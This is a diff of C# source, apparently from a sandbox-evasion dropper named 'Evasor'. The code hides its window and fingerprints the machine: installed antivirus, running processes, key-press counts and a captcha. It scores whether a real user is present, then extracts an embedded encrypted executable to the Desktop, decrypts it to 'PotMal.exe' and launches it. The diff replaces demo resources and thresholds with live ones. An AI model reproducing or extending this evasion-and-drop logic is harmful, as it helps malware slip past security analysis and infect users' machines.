@@ -127,65 +127,6 @@ namespace Evasor
                 foreach (ManagementObject objManagement in objMOS.Get())
                 {
                     return objManagement.GetPropertyValue("Version").ToString();
-                    //return objManagement.GetPropertyValue("BuildNumber").ToString();
-
-                    /*object osCaption = objManagement.GetPropertyValue("Caption");
-                    if (osCaption != null)
-                    {
-                        string osC = Regex.Replace(osCaption.ToString(), "[^A-Za-z0-9 ]", "");
-                        if (osC.StartsWith("Microsoft"))
-                        {
-                            osC = osC.Substring(9);
-                        }
-                        if (osC.Trim().StartsWith("Windows"))
-                        {
-                            osC = osC.Trim().Substring(7);
-                        }
-                        os = osC.Trim();
-                        if (!String.IsNullOrEmpty(os))
-                        {
-                            object osSP = null;
-                            try
-                            {
-                                // Get OS service pack from WMI
-                                osSP = objManagement.GetPropertyValue("ServicePackMajorVersion");
-                                if (osSP != null && osSP.ToString() != "0")
-                                {
-                                    os += " Service Pack " + osSP.ToString();
-                                }
-                            }
-                            catch (Exception)
-                            {
-                                // There was a problem getting the service pack from WMI.  Try built-in Environment class.
-                                os += "\nUnable to extract service pack info from WMI\n" + "###############################";
-                            }
-                        }
-                        object osA = null;
-                        try
-                        {
-                            osA = objManagement.GetPropertyValue("OSArchitecture");
-                            if (osA != null)
-                            {
-                                string osAString = osA.ToString();
-                                OSArch = (osAString.Contains("64") ? 64 : 32);
-                            }
-                        }
-                        catch (Exception)
-                        {
-                        }
-                    }
-                    //Build number before decimal
-                    string bNumb = objManagement.GetPropertyValue("BuildNumber").ToString();
-                    os += "\nBuild Number - " + bNumb;
-                    if(int.Parse(bNumb) >= 18362)
-                    {
-                        
-                    }
-                    //Version details
-                    os += "\nVersion - " + objManagement.GetPropertyValue("Version");
-                    //Lenovo pc??
-                    os += "\nSystem Name? - " + objManagement.GetPropertyValue("CSName");
-                    */
                 }
             }
             catch (Exception)
@@ -249,39 +190,6 @@ namespace Evasor
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
         const int SW_HIDE = 0;
 
-        public static bool AntivirusInstalled()
-        {
-            //Antivirus recognition
-            string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
-            try
-            {
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
-                ManagementObjectCollection instances = searcher.Get();
-                int tmpCount = 0;
-                foreach (ManagementObject virusChecker in instances)
-                {
-                    var virusCheckerName = virusChecker["displayName"];
-                    if ((string)virusCheckerName == "Windows Defender")
-                    {
-                        continue;
-                    }
-                    tmpCount++;
-                    otpt += virusCheckerName + " | ";
-                }
-                if(tmpCount >= 1)
-                {
-                    score++;
-                    otpt += " +1 score for antivirus installation";
-                }
-                return instances.Count > 0;
-            }
-
-            catch
-            {
-                otpt += "\n___some mf exception in the AV code___\n" + "###############################";
-            }
-            return false;
-        }
         private struct SHQUERYRBINFO
         {
             public int cbSize;
@@ -297,7 +205,6 @@ namespace Evasor
         //Decrypt function for exec sample/Mal
         public static void DecryptFile(string inputFile, string outputFile)
         {
-
             {
                 UnicodeEncoding UE = new UnicodeEncoding();
                 byte[] key = UE.GetBytes(password);
@@ -331,8 +238,34 @@ namespace Evasor
             ShowWindow(handle, SW_HIDE);
 
             //Antivirus recognition------------------------------------------------------------------------------
-            bool returnCode = AntivirusInstalled();
-            otpt += "\nAntivirus Installed " + returnCode.ToString() + "\n";
+            try
+            {
+                string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
+                ManagementObjectSearcher searche = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
+                ManagementObjectCollection instances = searche.Get();
+                int tmpCount = 0;
+                foreach (ManagementObject virusChecker in instances)
+                {
+                    var virusCheckerName = virusChecker["displayName"];
+                    if ((string)virusCheckerName == "Windows Defender")
+                    {
+                        continue;
+                    }
+                    tmpCount++;
+                    otpt += virusCheckerName + " | ";
+                }
+                if (tmpCount >= 1)
+                {
+                    score++;
+                    otpt += " +1 score for antivirus installation";
+                }
+                else otpt += " +0 score for antivirus installation";
+            }
+
+            catch
+            {
+                otpt += "\n___some exception in the AV code___\n" + "###############################";
+            }
 
             //Browser
             Firefox obj = new Firefox();
@@ -691,7 +624,7 @@ namespace Evasor
             else otpt += " | +0 score for installedProg reg";
             otpt += "\n";
 
-            //List of running processes--------------------------------------------------------------------------
+            //Number of running processes--------------------------------------------------------------------------
             try
             {
                 Process[] processes = Process.GetProcesses();
@@ -1085,9 +1018,9 @@ namespace Evasor
             //RTKeyCount.exe-------------------------------------------------------------------------------------
             try
             {
-                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.RTKeyCount_Demo.exe"))
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.RTKeyCount.exe"))
                 {
-                    using (FileStream fileStream = new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.RTKeyCount_Demo.exe"), FileMode.Create))
+                    using (FileStream fileStream = new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.RTKeyCount.exe"), FileMode.Create))
                     {
                         for (int i = 0; i < stream.Length; i++)
                         {
@@ -1105,7 +1038,7 @@ namespace Evasor
             {
                 Process RTProc = new Process();
                 ProcessStartInfo RTstartInfo = new ProcessStartInfo();
-                RTstartInfo.FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.RTKeyCount_Demo.exe");
+                RTstartInfo.FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.RTKeyCount.exe");
                 RTProc.StartInfo = RTstartInfo;
                 RTProc.Start();
                 RTProc.WaitForExit();
@@ -1116,7 +1049,7 @@ namespace Evasor
             }
 
             //Delete Files created
-            File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.RTKeyCount_Demo.exe"));
+            File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.RTKeyCount.exe"));
 
             if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\timer.txt"))
             {
@@ -1157,7 +1090,7 @@ namespace Evasor
                 string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\rtKsct.txt");
                 otpt += "\nCount of key down events: " + text;
                 int keyDowns = int.Parse(text);
-                /*if (keyDowns < 10 && keyDowns > 0) otpt += " | +0 score for key downs";
+                if (keyDowns < 10 && keyDowns > 0) otpt += " | +0 score for key downs";
                 else if(keyDowns >= 10 && keyDowns < 100)
                 {
                     score++;
@@ -1167,18 +1100,8 @@ namespace Evasor
                 {
                     score--;
                     otpt += " | -1 score for key downs";
-                }*/
-                //for Demonstration
-                if(keyDowns >= 10)
-                {
-                    score++;
-                    otpt += " | +1 score for key downs";
                 }
-                else
-                {
-                    score--;
-                    otpt += " | -1 score for key downs";
-                }
+
                 //Delete
                 File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\rtKsct.txt");
             }
@@ -1264,6 +1187,7 @@ namespace Evasor
                 if (text.EndsWith("1"))
                 {
                     otpt += "\nReverse Turing Captcha test passed";
+                    rtTestPassed = true;
                 }
                 else
                 {
@@ -1286,10 +1210,8 @@ namespace Evasor
                 try
                 {
                     using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.EncPotMal.exe"))
-                    //using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Evasor.sampleMalEnc.exe"))
                     {
                         using (FileStream fileStream = new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.EncPotMal.exe"), FileMode.Create))
-                        //using (FileStream fileStream = new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.sampleMalEnc.exe"), FileMode.Create))
                         {
                             for (int i = 0; i < stream.Length; i++)
                             {
@@ -1309,8 +1231,6 @@ namespace Evasor
                 {
                     DecryptFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.EncPotMal.exe"),
                         Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "PotMal.exe"));
-                    //DecryptFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evasor.sampleMalEnc.exe"),
-                    //  Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "PotMal.exe"));
                     //Start Mal/exec
                     try
                     {
